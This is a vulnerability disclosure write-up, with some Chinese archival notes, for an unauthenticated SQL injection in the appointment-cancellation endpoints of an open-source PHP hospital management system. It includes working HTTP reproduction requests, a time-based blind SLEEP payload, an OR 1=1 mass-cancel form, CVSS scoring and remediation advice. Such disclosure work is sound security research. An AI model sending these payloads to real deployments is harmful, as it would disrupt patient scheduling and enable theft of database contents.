# Hospital-Management-System Appointment Cancellation SQL Injection (vanilla PHP + MySQLi)

> ⚠️ **COVERED / 勿提交**: 提报前查重发现在先披露——**GitHub issue #64/#53 (2026: Systemic SQL Injection + No Authentication — 系统性覆盖)**。本目录仅作研究存档,不提交 VulDB。
**CWE-89 · Unauthenticated SQL injection (UPDATE) · appointment tampering + time-based blind extraction**

> **Vendor:** kishan0725
> **Product:** Hospital-Management-System (vanilla PHP + MySQLi)
> **Affected version:** master branch, commit 777fda46b77a820977a5ba616283dbfbc40bf7e1 (last commit 2024-10-07; no official release version)
> **Affected endpoints:** GET /admin-panel.php?cancel=1&ID=<inj>; GET /doctor-panel.php?cancel=1&ID=<inj>
> **Dedup status:** PARTIAL — the `?cancel=1&ID=` entry point is shared with CVE-2025-63513 (IDOR on the same endpoint) and with the UNION-based bill-PDF sink (separate submission), but this submission is a distinct vulnerability class and root cause: raw concatenation of `ID` into UPDATE statements. No prior CVE covers these UPDATE sinks.
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The appointment-cancellation handlers of both dashboards concatenate the GET parameter `ID` raw into UPDATE statements and execute it with `mysqli_query`. Neither `admin-panel.php` nor `doctor-panel.php` contains any session or role check. Any anonymous visitor can (a) cancel arbitrary appointments (unauthenticated status change) and (b) run time-based blind SQL injection against both UPDATE sinks, providing a boolean/timing oracle for data extraction.

## 2. Root Cause

| File | Line | Statement |
|---|---|---|
| `admin-panel.php` | 71 | patient-dashboard cancel UPDATE (below) |
| `doctor-panel.php` | 8 | doctor-dashboard cancel UPDATE (below) |

```php
// admin-panel.php:70-71 (entry: GET ?cancel=1&ID=<inj>)
if (isset($_GET['cancel'])) {
    mysqli_query($con, "update appointmenttb set userStatus='0' where ID = '".$_GET['ID']."'");
}

// doctor-panel.php:7-8 (entry: GET ?cancel=1&ID=<inj>)
if (isset($_GET['cancel'])) {
    mysqli_query($con, "update appointmenttb set doctorStatus='0' where ID = '".$_GET['ID']."'");
}
```

Raw string concatenation of `$_GET['ID']`, zero filtering, no prepared statement, and no authentication gate anywhere in either file (the pages read `$_SESSION` values without any `isset`/redirect check).

## 3. Prerequisites

None. No authentication is required; a plain GET request without a Cookie header reaches both sinks.

## 4. Reproduction

Unauthenticated appointment cancellation (integrity break, database-diff verified):

```http
GET /admin-panel.php?cancel=1&ID=4 HTTP/1.1

# no Cookie header; DB row 4: userStatus 1 -> 0
GET /doctor-panel.php?cancel=1&ID=2 HTTP/1.1

# no Cookie header; DB row 2: doctorStatus 1 -> 0
```

Time-based blind injection (12 seeded `appointmenttb` rows; the OR predicate is evaluated per row):

```http
GET /admin-panel.php?cancel=1&ID=999 HTTP/1.1
# baseline: HTTP 200 in 0.110 s

GET /admin-panel.php?cancel=1&ID=999%27%20OR%20%28SELECT%20858%29%3E%28SELECT%20SLEEP%281%29%29--%20- HTTP/1.1
# decodes to: 999' OR (SELECT 858)>(SELECT SLEEP(1))-- -
# result: HTTP 200 in 12.189 s (12 rows x SLEEP(1))
```

Doctor-panel variant: same payload against `/doctor-panel.php?cancel=1&ID=` — 12.173 s vs 0.078 s baseline.

Runnable PoC: `poc/poc.sh`.

## 5. Confirmed Techniques

- Manual verification on a local instance: MySQL 8.0.39 (127.0.0.1:3307), PHP 8.4.26 built-in server, `display_errors=0`, seeded `myhmsdb.sql`.
- Unauthorized cancel on both sinks with no session (database before/after diff).
- Time-based blind oracle on both sinks: 12.189 s / 12.173 s vs 0.110 s / 0.078 s baselines.
- Payload note: the OR-comparison form is required; an AND form with a false first operand short-circuits and never evaluates `SLEEP()` — do not "simplify" the PoC to AND.

## 6. Impact

- Integrity: an anonymous attacker can cancel arbitrary appointments for any patient and any doctor, or mass-cancel via injected OR clauses (`ID=x' OR 1=1-- -` style), disrupting clinic scheduling.
- Confidentiality: the timing oracle supports blind extraction of database content from the UPDATE context.
- The same unauthenticated reachability is what makes the adjacent bill-PDF sink (separate submission) exploitable end-to-end.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N` (Base 8.2, High)

## 8. Remediation

- Use a prepared statement with a bound integer parameter for `ID` in both files.
- Add an explicit session/role check at the top of `admin-panel.php` and `doctor-panel.php`; reject cancel requests for rows not owned by the session.

## 9. References

- Project: https://github.com/kishan0725/Hospital-Management-System
- Commit: 777fda46b77a820977a5ba616283dbfbc40bf7e1 (master, 2024-10-07)
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

> 🗑️ External disclosure gist 已下线(2026-09-29): 在先披露密集(issue #71/#64/#49 等),本洞不提交 VulDB。
- VulDB submission #xxxxxx
- Local verification record: `evidence/HMS-01.txt`, `evidence/HMS-03.txt`; PoC: `poc/poc.sh`

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
